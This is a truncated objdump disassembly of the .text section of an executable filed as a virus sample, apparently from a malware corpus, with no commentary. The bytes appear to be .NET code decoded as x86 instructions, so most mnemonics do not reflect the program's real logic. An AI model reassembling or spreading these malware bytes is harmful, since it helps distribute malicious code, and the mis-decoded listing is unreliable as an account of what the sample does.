
malware_samples/virus/f4d0a71613ef44605049f708e224f93b96846174565eeaf3c857f18af58f5f6a.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b0 ab                	mov    $0xab,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 a0 65 00    	add    %al,0x65a000
  402013:	00 d8                	add    %bl,%al
  402015:	45                   	inc    %ebp
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	12 00                	adc    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	26 02 28             	add    %es:(%eax),%ch
  402053:	06                   	push   %es
  402054:	00 00                	add    %al,(%eax)
  402056:	0a 00                	or     (%eax),%al
  402058:	00 2a                	add    %ch,(%edx)
  40205a:	2a 00                	sub    (%eax),%al
  40205c:	02 28                	add    (%eax),%ch
  40205e:	08 00                	or     %al,(%eax)
  402060:	00 0a                	add    %cl,(%edx)
  402062:	00 00                	add    %al,(%eax)
  402064:	2a aa 73 17 00 00    	sub    0x1773(%edx),%ch
  40206a:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402070:	73 18                	jae    0x40208a
  402072:	00 00                	add    %al,(%eax)
  402074:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  40207a:	73 19                	jae    0x402095
  40207c:	00 00                	add    %al,(%eax)
  40207e:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  402084:	73 1a                	jae    0x4020a0
  402086:	00 00                	add    %al,(%eax)
  402088:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  40208e:	00 2a                	add    %ch,(%edx)
  402090:	13 30                	adc    (%eax),%esi
  402092:	01 00                	add    %eax,(%eax)
  402094:	10 00                	adc    %al,(%eax)
  402096:	00 00                	add    %al,(%eax)
  402098:	01 00                	add    %eax,(%eax)
  40209a:	00 11                	add    %dl,(%ecx)
  40209c:	00 7e 01             	add    %bh,0x1(%esi)
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	04 6f                	add    $0x6f,%al
  4020a3:	1b 00                	sbb    (%eax),%eax
  4020a5:	00 0a                	add    %cl,(%edx)
  4020a7:	0a 2b                	or     (%ebx),%ch
  4020a9:	00 06                	add    %al,(%esi)
  4020ab:	2a 13                	sub    (%ebx),%dl
  4020ad:	30 01                	xor    %al,(%ecx)
  4020af:	00 10                	add    %dl,(%eax)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	00 02                	add    %al,(%edx)
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	11 00                	adc    %eax,(%eax)
  4020b9:	7e 02                	jle    0x4020bd
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	04 6f                	add    $0x6f,%al
  4020bf:	1c 00                	sbb    $0x0,%al
  4020c1:	00 0a                	add    %cl,(%edx)
  4020c3:	0a 2b                	or     (%ebx),%ch
  4020c5:	00 06                	add    %al,(%esi)
  4020c7:	2a 13                	sub    (%ebx),%dl
  4020c9:	30 01                	xor    %al,(%ecx)
  4020cb:	00 10                	add    %dl,(%eax)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	00 03                	add    %al,(%ebx)
  4020d1:	00 00                	add    %al,(%eax)
  4020d3:	11 00                	adc    %eax,(%eax)
  4020d5:	7e 03                	jle    0x4020da
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	04 6f                	add    $0x6f,%al
  4020db:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
  4020e0:	2b 00                	sub    (%eax),%eax
  4020e2:	06                   	push   %es
  4020e3:	2a 13                	sub    (%ebx),%dl
  4020e5:	30 01                	xor    %al,(%ecx)
  4020e7:	00 10                	add    %dl,(%eax)
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ee:	00 11                	add    %dl,(%ecx)
  4020f0:	00 7e 04             	add    %bh,0x4(%esi)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 6f                	add    $0x6f,%al
  4020f7:	1e                   	push   %ds
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	0a 0a                	or     (%edx),%cl
  4020fc:	2b 00                	sub    (%eax),%eax
  4020fe:	06                   	push   %es
  4020ff:	2a 13                	sub    (%ebx),%dl
  402101:	30 02                	xor    %al,(%edx)
  402103:	00 12                	add    %dl,(%edx)
  402105:	00 00                	add    %al,(%eax)
  402107:	00 05 00 00 11 00    	add    %al,0x110000
  40210d:	02 03                	add    (%ebx),%al
  40210f:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402112:	00 0a                	add    %cl,(%edx)
  402114:	28 0d 00 00 0a 0a    	sub    %cl,0xa0a0000
  40211a:	2b 00                	sub    (%eax),%eax
  40211c:	06                   	push   %es
  40211d:	2a 00                	sub    (%eax),%al
  40211f:	00 13                	add    %dl,(%ebx)
  402121:	30 01                	xor    %al,(%ecx)
  402123:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402126:	00 00                	add    %al,(%eax)
  402128:	06                   	push   %es
  402129:	00 00                	add    %al,(%eax)
  40212b:	11 00                	adc    %eax,(%eax)
  40212d:	02 28                	add    (%eax),%ch
  40212f:	0e                   	push   %cs
  402130:	00 00                	add    %al,(%eax)
  402132:	0a 0a                	or     (%edx),%cl
  402134:	2b 00                	sub    (%eax),%eax
  402136:	06                   	push   %es
  402137:	2a 13                	sub    (%ebx),%dl
  402139:	30 01                	xor    %al,(%ecx)
  40213b:	00 10                	add    %dl,(%eax)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	00 07                	add    %al,(%edi)
  402141:	00 00                	add    %al,(%eax)
  402143:	11 00                	adc    %eax,(%eax)
  402145:	d0 05 00 00 02 28    	rolb   $1,0x28020000
  40214b:	0f 00 00             	sldt   (%eax)
  40214e:	0a 0a                	or     (%edx),%cl
  402150:	2b 00                	sub    (%eax),%eax
  402152:	06                   	push   %es
  402153:	2a 13                	sub    (%ebx),%dl
  402155:	30 01                	xor    %al,(%ecx)
  402157:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40215a:	00 00                	add    %al,(%eax)
  40215c:	08 00                	or     %al,(%eax)
  40215e:	00 11                	add    %dl,(%ecx)
  402160:	00 02                	add    %al,(%edx)
  402162:	28 10                	sub    %dl,(%eax)
  402164:	00 00                	add    %al,(%eax)
  402166:	0a 0a                	or     (%edx),%cl
  402168:	2b 00                	sub    (%eax),%eax
  40216a:	06                   	push   %es
  40216b:	2a 13                	sub    (%ebx),%dl
  40216d:	30 02                	xor    %al,(%edx)
  40216f:	00 20                	add    %ah,(%eax)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 09                	add    %cl,(%ecx)
  402175:	00 00                	add    %al,(%eax)
  402177:	11 00                	adc    %eax,(%eax)
  402179:	02 8c 01 00 00 1b 14 	add    0x141b0000(%ecx,%eax,1),%cl
  402180:	fe 01                	incb   (%ecx)
  402182:	0b 07                	or     (%edi),%eax
  402184:	2c 0a                	sub    $0xa,%al
  402186:	28 01                	sub    %al,(%ecx)
  402188:	00 00                	add    %al,(%eax)
  40218a:	2b 0a                	sub    (%edx),%ecx
  40218c:	2b 08                	sub    (%eax),%ecx
  40218e:	2b 05 00 02 0a 2b    	sub    0x2b0a0200,%eax
  402194:	01 00                	add    %eax,(%eax)
  402196:	06                   	push   %es
  402197:	2a 13                	sub    (%ebx),%dl
  402199:	30 02                	xor    %al,(%edx)
  40219b:	00 12                	add    %dl,(%edx)
  40219d:	00 00                	add    %al,(%eax)
  40219f:	00 0a                	add    %cl,(%edx)
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	11 00                	adc    %eax,(%eax)
  4021a5:	03 12                	add    (%edx),%edx
  4021a7:	00 fe                	add    %bh,%dh
  4021a9:	15 01 00 00 1b       	adc    $0x1b000001,%eax
  4021ae:	06                   	push   %es
  4021af:	81 01 00 00 1b 00    	addl   $0x1b0000,(%ecx)
  4021b5:	2a 2a                	sub    (%edx),%ch
  4021b7:	00 02                	add    %al,(%edx)
  4021b9:	28 12                	sub    %dl,(%edx)
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	0a 00                	or     (%eax),%al
  4021bf:	00 2a                	add    %ch,(%edx)
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	00 13                	add    %dl,(%ebx)
  4021c5:	30 02                	xor    %al,(%edx)
  4021c7:	00 26                	add    %ah,(%esi)
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 0b                	add    %cl,(%ebx)
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	11 00                	adc    %eax,(%eax)
  4021d1:	7e 16                	jle    0x4021e9
  4021d3:	00 00                	add    %al,(%eax)
  4021d5:	0a 8c 03 00 00 1b 14 	or     0x141b0000(%ebx,%eax,1),%cl
  4021dc:	fe 01                	incb   (%ecx)
  4021de:	0b 07                	or     (%edi),%eax
  4021e0:	2c 0a                	sub    $0xa,%al
  4021e2:	28 02                	sub    %al,(%edx)
  4021e4:	00 00                	add    %al,(%eax)
  4021e6:	2b 80 16 00 00 0a    	sub    0xa000016(%eax),%eax
  4021ec:	7e 16                	jle    0x402204
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	0a 0a                	or     (%edx),%cl
  4021f2:	2b 00                	sub    (%eax),%eax
  4021f4:	06                   	push   %es
  4021f5:	2a 2a                	sub    (%edx),%ch
  4021f7:	00 02                	add    %al,(%edx)
  4021f9:	28 12                	sub    %dl,(%edx)
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	0a 00                	or     (%eax),%al
  4021ff:	00 2a                	add    %ch,(%edx)
  402201:	26 02 28             	add    %es:(%eax),%ch
  402204:	12 00                	adc    (%eax),%al
  402206:	00 0a                	add    %cl,(%edx)
  402208:	00 00                	add    %al,(%eax)
  40220a:	2a 26                	sub    (%esi),%ah
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	32 00                	xor    (%eax),%al
  402210:	00 06                	add    %al,(%esi)
  402212:	00 00                	add    %al,(%eax)
  402214:	2a 00                	sub    (%eax),%al
  402216:	00 00                	add    %al,(%eax)
  402218:	03 30                	add    (%eax),%esi
  40221a:	01 00                	add    %eax,(%eax)
  40221c:	80 01 00             	addb   $0x0,(%ecx)
  40221f:	00 00                	add    %al,(%eax)
  402221:	00 00                	add    %al,(%eax)
  402223:	00 20                	add    %ah,(%eax)
  402225:	01 14 00             	add    %edx,(%eax,%eax,1)
  402228:	00 8d 1c 00 00 01    	add    %cl,0x100001c(%ebp)
  40222e:	80 0a 00             	orb    $0x0,(%edx)
  402231:	00 04 72             	add    %al,(%edx,%esi,2)
  402234:	01 00                	add    %eax,(%eax)
  402236:	00 70 28             	add    %dh,0x28(%eax)
  402239:	21 00                	and    %eax,(%eax)
  40223b:	00 0a                	add    %cl,(%edx)
  40223d:	80 0b 00             	orb    $0x0,(%ebx)
  402240:	00 04 14             	add    %al,(%esp,%edx,1)
  402243:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  402247:	04 16                	add    $0x16,%al
  402249:	80 0d 00 00 04 72 0b 	orb    $0xb,0x72040000
  402250:	00 00                	add    %al,(%eax)
  402252:	70 80                	jo     0x4021d4
  402254:	0e                   	push   %cs
  402255:	00 00                	add    %al,(%eax)
  402257:	04 72                	add    $0x72,%al
  402259:	23 00                	and    (%eax),%eax
  40225b:	00 70 80             	add    %dh,-0x80(%eax)
  40225e:	0f 00 00             	sldt   (%eax)
  402261:	04 73                	add    $0x73,%al
  402263:	08 00                	or     %al,(%eax)
  402265:	00 0a                	add    %cl,(%edx)
  402267:	80 10 00             	adcb   $0x0,(%eax)
  40226a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40226d:	13 00                	adc    (%eax),%eax
  40226f:	00 04 28             	add    %al,(%eax,%ebp,1)
  402272:	27                   	daa
  402273:	00 00                	add    %al,(%eax)
  402275:	06                   	push   %es
  402276:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40227e:	00 0a                	add    %cl,(%edx)
  402280:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402283:	00 0a                	add    %cl,(%edx)
  402285:	28 22                	sub    %ah,(%edx)
  402287:	00 00                	add    %al,(%eax)
  402289:	0a 80 12 00 00 04    	or     0x4000012(%eax),%al
  40228f:	72 39                	jb     0x4022ca
  402291:	00 00                	add    %al,(%eax)
  402293:	70 80                	jo     0x402215
  402295:	13 00                	adc    (%eax),%eax
  402297:	00 04 72             	add    %al,(%edx,%esi,2)
  40229a:	01 00                	add    %eax,(%eax)
  40229c:	00 70 28             	add    %dh,0x28(%eax)
  40229f:	21 00                	and    %eax,(%eax)
  4022a1:	00 0a                	add    %cl,(%edx)
  4022a3:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  4022a7:	04 72                	add    $0x72,%al
  4022a9:	01 00                	add    %eax,(%eax)
  4022ab:	00 70 28             	add    %dh,0x28(%eax)
  4022ae:	21 00                	and    %eax,(%eax)
  4022b0:	00 0a                	add    %cl,(%edx)
  4022b2:	80 15 00 00 04 72 01 	adcb   $0x1,0x72040000
  4022b9:	00 00                	add    %al,(%eax)
  4022bb:	70 28                	jo     0x4022e5
  4022bd:	21 00                	and    %eax,(%eax)
  4022bf:	00 0a                	add    %cl,(%edx)
  4022c1:	80 16 00             	adcb   $0x0,(%esi)
  4022c4:	00 04 14             	add    %al,(%esp,%edx,1)
  4022c7:	80 17 00             	adcb   $0x0,(%edi)
  4022ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4022cd:	69 00 00 70 80 18    	imul   $0x18807000,(%eax),%eax
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 28                	add    $0x28,%al
  4022d7:	23 00                	and    (%eax),%eax
  4022d9:	00 0a                	add    %cl,(%edx)
  4022db:	6f                   	outsl  %ds:(%esi),(%dx)
  4022dc:	24 00                	and    $0x0,%al
  4022de:	00 0a                	add    %cl,(%edx)
  4022e0:	73 25                	jae    0x402307
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  4022ea:	73 26                	jae    0x402312
  4022ec:	00 00                	add    %al,(%eax)
  4022ee:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  4022f4:	14 80                	adc    $0x80,%al
  4022f6:	1b 00                	sbb    (%eax),%eax
  4022f8:	00 04 16             	add    %al,(%esi,%edx,1)
  4022fb:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  4022ff:	04 72                	add    $0x72,%al
  402301:	6b 00 00             	imul   $0x0,(%eax),%eax
  402304:	70 80                	jo     0x402286
  402306:	1d 00 00 04 14       	sbb    $0x14040000,%eax
  40230b:	80 1e 00             	sbbb   $0x0,(%esi)
  40230e:	00 04 72             	add    %al,(%edx,%esi,2)
  402311:	75 00                	jne    0x402313
  402313:	00 70 80             	add    %dh,-0x80(%eax)
  402316:	1f                   	pop    %ds
  402317:	00 00                	add    %al,(%eax)
  402319:	04 72                	add    $0x72,%al
  40231b:	b7 00                	mov    $0x0,%bh
  40231d:	00 70 80             	add    %dh,-0x80(%eax)
  402320:	20 00                	and    %al,(%eax)
  402322:	00 04 72             	add    %al,(%edx,%esi,2)
  402325:	13 01                	adc    (%ecx),%eax
  402327:	00 70 80             	add    %dh,-0x80(%eax)
  40232a:	21 00                	and    %eax,(%eax)
  40232c:	00 04 72             	add    %al,(%edx,%esi,2)
  40232f:	19 01                	sbb    %eax,(%ecx)
  402331:	00 70 80             	add    %dh,-0x80(%eax)
  402334:	22 00                	and    (%eax),%al
  402336:	00 04 72             	add    %al,(%edx,%esi,2)
  402339:	2b 01                	sub    (%ecx),%eax
  40233b:	00 70 80             	add    %dh,-0x80(%eax)
  40233e:	23 00                	and    (%eax),%eax
  402340:	00 04 72             	add    %al,(%edx,%esi,2)
  402343:	37                   	aaa
  402344:	01 00                	add    %eax,(%eax)
  402346:	70 80                	jo     0x4022c8
  402348:	24 00                	and    $0x0,%al
  40234a:	00 04 72             	add    %al,(%edx,%esi,2)
  40234d:	01 00                	add    %eax,(%eax)
  40234f:	00 70 28             	add    %dh,0x28(%eax)
  402352:	21 00                	and    %eax,(%eax)
  402354:	00 0a                	add    %cl,(%edx)
  402356:	80 25 00 00 04 72 43 	andb   $0x43,0x72040000
  40235d:	01 00                	add    %eax,(%eax)
  40235f:	70 80                	jo     0x4022e1
  402361:	26 00 00             	add    %al,%es:(%eax)
  402364:	04 72                	add    $0x72,%al
  402366:	01 00                	add    %eax,(%eax)
  402368:	00 70 28             	add    %dh,0x28(%eax)
  40236b:	21 00                	and    %eax,(%eax)
  40236d:	00 0a                	add    %cl,(%edx)
  40236f:	80 27 00             	andb   $0x0,(%edi)
  402372:	00 04 72             	add    %al,(%edx,%esi,2)
  402375:	01 00                	add    %eax,(%eax)
  402377:	00 70 28             	add    %dh,0x28(%eax)
  40237a:	21 00                	and    %eax,(%eax)
  40237c:	00 0a                	add    %cl,(%edx)
  40237e:	80 28 00             	subb   $0x0,(%eax)
  402381:	00 04 72             	add    %al,(%edx,%esi,2)
  402384:	5d                   	pop    %ebp
  402385:	01 00                	add    %eax,(%eax)
  402387:	70 80                	jo     0x402309
  402389:	29 00                	sub    %eax,(%eax)
  40238b:	00 04 72             	add    %al,(%edx,%esi,2)
  40238e:	01 00                	add    %eax,(%eax)
  402390:	00 70 28             	add    %dh,0x28(%eax)
  402393:	21 00                	and    %eax,(%eax)
  402395:	00 0a                	add    %cl,(%edx)
  402397:	80 2a 00             	subb   $0x0,(%edx)
  40239a:	00 04 14             	add    %al,(%esp,%edx,1)
  40239d:	80 2b 00             	subb   $0x0,(%ebx)
  4023a0:	00 04 00             	add    %al,(%eax,%eax,1)
  4023a3:	2a 26                	sub    (%esi),%ah
  4023a5:	02 28                	add    (%eax),%ch
  4023a7:	12 00                	adc    (%eax),%al
  4023a9:	00 0a                	add    %cl,(%edx)
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	2a 3e                	sub    (%esi),%bh
  4023af:	00 02                	add    %al,(%edx)
  4023b1:	74 08                	je     0x4023bb
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	1b 28                	sbb    (%eax),%ebp
  4023b7:	2f                   	das
  4023b8:	00 00                	add    %al,(%eax)
  4023ba:	06                   	push   %es
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	2a 26                	sub    (%esi),%ah
  4023bf:	00 28                	add    %ch,(%eax)
  4023c1:	23 00                	and    (%eax),%eax
  4023c3:	00 06                	add    %al,(%esi)
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	2a 1b                	sub    (%ebx),%bl
  4023c9:	30 03                	xor    %al,(%ebx)
  4023cb:	00 6b 00             	add    %ch,0x0(%ebx)
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	0c 00                	or     $0x0,%al
  4023d2:	00 11                	add    %dl,(%ecx)
  4023d4:	00 00                	add    %al,(%eax)
  4023d6:	28 1a                	sub    %bl,(%edx)
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	06                   	push   %es
  4023db:	0c 08                	or     $0x8,%al
  4023dd:	7e 27                	jle    0x402406
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	0a 28                	or     (%eax),%ch
  4023e3:	28 00                	sub    %al,(%eax)
  4023e5:	00 0a                	add    %cl,(%edx)
  4023e7:	13 05 11 05 2c 08    	adc    0x82c0511,%eax
  4023ed:	72 69                	jb     0x402458
  4023ef:	00 00                	add    %al,(%eax)
  4023f1:	70 0a                	jo     0x4023fd
  4023f3:	de 48 00             	fimuls 0x0(%eax)
  4023f6:	08 28                	or     %ch,(%eax)
  4023f8:	29 00                	sub    %eax,(%eax)
  4023fa:	00 0a                	add    %cl,(%edx)
  4023fc:	28 1d 00 00 06 17    	sub    %bl,0x17060000
  402402:	d6                   	salc
  402403:	28 2a                	sub    %ch,(%edx)
  402405:	00 00                	add    %al,(%eax)
  402407:	0a 0d 08 12 03 09    	or     0x9031208,%cl
  40240d:	6f                   	outsl  %ds:(%esi),(%dx)
  40240e:	2b 00                	sub    (%eax),%eax
  402410:	00 0a                	add    %cl,(%edx)
  402412:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402415:	00 06                	add    %al,(%esi)
  402417:	26 12 03             	adc    %es:(%ebx),%al
  40241a:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40241d:	00 06                	add    %al,(%esi)
  40241f:	0b de                	or     %esi,%ebx
  402421:	16                   	push   %ss
  402422:	25 28 2c 00 00       	and    $0x2c28,%eax
  402427:	0a 13                	or     (%ebx),%dl
  402429:	04 00                	add    $0x0,%al
  40242b:	72 69                	jb     0x402496
  40242d:	00 00                	add    %al,(%eax)
  40242f:	70 0b                	jo     0x40243c
  402431:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402437:	00 00                	add    %al,(%eax)
  402439:	07                   	pop    %es
  40243a:	0a 2b                	or     (%ebx),%ch
  40243c:	00 06                	add    %al,(%esi)
  40243e:	2a 00                	sub    (%eax),%al
  402440:	01 10                	add    %edx,(%eax)
  402442:	00 00                	add    %al,(%eax)
  402444:	00 00                	add    %al,(%eax)
  402446:	02 00                	add    (%eax),%al
  402448:	4c                   	dec    %esp
  402449:	4e                   	dec    %esi
  40244a:	00 16                	add    %dl,(%esi)
  40244c:	20 00                	and    %al,(%eax)
  40244e:	00 01                	add    %al,(%ecx)
  402450:	13 30                	adc    (%eax),%esi
  402452:	02 00                	add    (%eax),%al
  402454:	12 00                	adc    (%eax),%al
  402456:	00 00                	add    %al,(%eax)
  402458:	08 00                	or     %al,(%eax)
  40245a:	00 11                	add    %dl,(%ecx)
  40245c:	00 28                	add    %ch,(%eax)
  40245e:	2e 00 00             	add    %al,%cs:(%eax)
  402461:	0a 02                	or     (%edx),%al
  402463:	50                   	push   %eax
  402464:	6f                   	outsl  %ds:(%esi),(%dx)
  402465:	2f                   	das
  402466:	00 00                	add    %al,(%eax)
  402468:	0a 0a                	or     (%edx),%cl
  40246a:	2b 00                	sub    (%eax),%eax
  40246c:	06                   	push   %es
  40246d:	2a 00                	sub    (%eax),%al
  40246f:	00 1b                	add    %bl,(%ebx)
  402471:	30 05 00 57 00 00    	xor    %al,0x5700
  402477:	00 0d 00 00 11 00    	add    %cl,0x110000
  40247d:	00 16                	add    %dl,(%esi)
  40247f:	0b 00                	or     (%eax),%eax
  402481:	07                   	pop    %es
  402482:	b5 1f                	mov    $0x1f,%ch
  402484:	64 28 2a             	sub    %ch,%fs:(%edx)
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 0d 12 03 1f 64    	or     0x641f0312,%cl
  40248f:	14 13                	adc    $0x13,%al
  402491:	04 12                	add    $0x12,%al
  402493:	04 1f                	add    $0x1f,%al
  402495:	64 28 1e             	sub    %bl,%fs:(%esi)
  402498:	00 00                	add    %al,(%eax)
  40249a:	06                   	push   %es
  40249b:	13 05 11 05 2c 04    	adc    0x42c0511,%eax
  4024a1:	17                   	pop    %ss
  4024a2:	0a de                	or     %dh,%bl
  4024a4:	2c 00                	sub    $0x0,%al
  4024a6:	07                   	pop    %es
  4024a7:	17                   	pop    %ss
  4024a8:	d6                   	salc
  4024a9:	0b 07                	or     (%edi),%eax
  4024ab:	1a fe                	sbb    %dh,%bh
  4024ad:	02 16                	add    (%esi),%dl
  4024af:	fe 01                	incb   (%ecx)
  4024b1:	13 05 11 05 2d ca    	adc    0xca2d0511,%eax
  4024b7:	de 0f                	fimuls (%edi)
  4024b9:	25 28 2c 00 00       	and    $0x2c28,%eax
  4024be:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4024c1:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	16                   	push   %ss
  4024ca:	0a 2b                	or     (%ebx),%ch
  4024cc:	04 16                	add    $0x16,%al
  4024ce:	0a 2b                	or     (%ebx),%ch
  4024d0:	00 06                	add    %al,(%esi)
  4024d2:	2a 00                	sub    (%eax),%al
  4024d4:	01 10                	add    %edx,(%eax)
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	00 00                	add    %al,(%eax)
  4024da:	02 00                	add    (%eax),%al
  4024dc:	3b 3d 00 0f 20 00    	cmp    0x200f00,%edi
  4024e2:	00 01                	add    %al,(%ecx)
  4024e4:	13 30                	adc    (%eax),%esi
  4024e6:	03 00                	add    (%eax),%eax
  4024e8:	9d                   	popf
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 0e                	add    %cl,(%esi)
  4024ed:	00 00                	add    %al,(%eax)
  4024ef:	11 00                	adc    %eax,(%eax)
  4024f1:	02 6f 30             	add    0x30(%edi),%ch
  4024f4:	00 00                	add    %al,(%eax)
  4024f6:	0a 6f 31             	or     0x31(%edi),%ch
  4024f9:	00 00                	add    %al,(%eax)
  4024fb:	0a 03                	or     (%ebx),%al
  4024fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024fe:	30 00                	xor    %al,(%eax)
  402500:	00 0a                	add    %cl,(%edx)
  402502:	6f                   	outsl  %ds:(%esi),(%dx)
  402503:	31 00                	xor    %eax,(%eax)
  402505:	00 0a                	add    %cl,(%edx)
  402507:	16                   	push   %ss
  402508:	28 32                	sub    %dh,(%edx)
  40250a:	00 00                	add    %al,(%eax)
  40250c:	0a 16                	or     (%esi),%dl
  40250e:	fe 01                	incb   (%ecx)
  402510:	0d 09 2c 72 02       	or     $0x2722c09,%eax
  402515:	6f                   	outsl  %ds:(%esi),(%dx)
  402516:	33 00                	xor    (%eax),%eax
  402518:	00 0a                	add    %cl,(%edx)
  40251a:	0b 03                	or     (%ebx),%eax
  40251c:	6f                   	outsl  %ds:(%esi),(%dx)
  40251d:	33 00                	xor    (%eax),%eax
  40251f:	00 0a                	add    %cl,(%edx)
  402521:	0c 00                	or     $0x0,%al
  402523:	07                   	pop    %es
  402524:	6f                   	outsl  %ds:(%esi),(%dx)
  402525:	34 00                	xor    $0x0,%al
  402527:	00 0a                	add    %cl,(%edx)
  402529:	6f                   	outsl  %ds:(%esi),(%dx)
  40252a:	31 00                	xor    %eax,(%eax)
  40252c:	00 0a                	add    %cl,(%edx)
  40252e:	08 6f 34             	or     %ch,0x34(%edi)
  402531:	00 00                	add    %al,(%eax)
  402533:	0a 6f 31             	or     0x31(%edi),%ch
  402536:	00 00                	add    %al,(%eax)
  402538:	0a 16                	or     (%esi),%dl
  40253a:	28 32                	sub    %dh,(%edx)
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 16                	or     (%esi),%dl
  402540:	fe 01                	incb   (%ecx)
  402542:	16                   	push   %ss
  402543:	fe 01                	incb   (%ecx)
  402545:	0d 09 2c 04 16       	or     $0x16042c09,%eax
  40254a:	0a 2b                	or     (%ebx),%ch
  40254c:	3e 00 07             	add    %al,%ds:(%edi)
  40254f:	6f                   	outsl  %ds:(%esi),(%dx)
  402550:	35 00 00 0a 0b       	xor    $0xb0a0000,%eax
  402555:	08 6f 35             	or     %ch,0x35(%edi)
  402558:	00 00                	add    %al,(%eax)
  40255a:	0a 0c 07             	or     (%edi,%eax,1),%cl
  40255d:	14 fe                	adc    $0xfe,%al
  40255f:	01 08                	add    %ecx,(%eax)
  402561:	14 fe                	adc    $0xfe,%al
  402563:	01 5f 0d             	add    %ebx,0xd(%edi)
  402566:	09 2c 04             	or     %ebp,(%esp,%eax,1)
  402569:	17                   	pop    %ss
  40256a:	0a 2b                	or     (%ebx),%ch
  40256c:	1e                   	push   %ds
  40256d:	00 07                	add    %al,(%edi)
  40256f:	14 fe                	adc    $0xfe,%al
  402571:	01 0d 09 2c 04 16    	add    %ecx,0x16042c09
  402577:	0a 2b                	or     (%ebx),%ch
  402579:	11 00                	adc    %eax,(%eax)
  40257b:	08 14 fe             	or     %dl,(%esi,%edi,8)
  40257e:	01 16                	add    %edx,(%esi)
  402580:	fe 01                	incb   (%ecx)
  402582:	0d 09 2d 9d 00       	or     $0x9d2d09,%eax
  402587:	16                   	push   %ss
  402588:	0a 2b                	or     (%ebx),%ch
  40258a:	00 06                	add    %al,(%esi)
  40258c:	2a 00                	sub    (%eax),%al
  40258e:	00 00                	add    %al,(%eax)
  402590:	1b 30                	sbb    (%eax),%esi
  402592:	08 00                	or     %al,(%eax)
  402594:	7d 03                	jge    0x402599
  402596:	00 00                	add    %al,(%eax)
  402598:	0f 00 00             	sldt   (%eax)
  40259b:	11 00                	adc    %eax,(%eax)
  40259d:	16                   	push   %ss
  40259e:	80 0d 00 00 04 20 d0 	orb    $0xd0,0x20040000
  4025a5:	07                   	pop    %es
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	28 36                	sub    %dh,(%esi)
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	0a 00                	or     (%eax),%al
  4025ae:	7e 19                	jle    0x4025c9
  4025b0:	00 00                	add    %al,(%eax)
  4025b2:	04 0b                	add    $0xb,%al
  4025b4:	00 07                	add    %al,(%edi)
  4025b6:	13 08                	adc    (%eax),%ecx
  4025b8:	11 08                	adc    %ecx,(%eax)
  4025ba:	28 37                	sub    %dh,(%edi)
  4025bc:	00 00                	add    %al,(%eax)
  4025be:	0a 00                	or     (%eax),%al
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	7e 0c                	jle    0x4025d0
  4025c4:	00 00                	add    %al,(%eax)
  4025c6:	04 14                	add    $0x14,%al
  4025c8:	fe 01                	incb   (%ecx)
  4025ca:	16                   	push   %ss
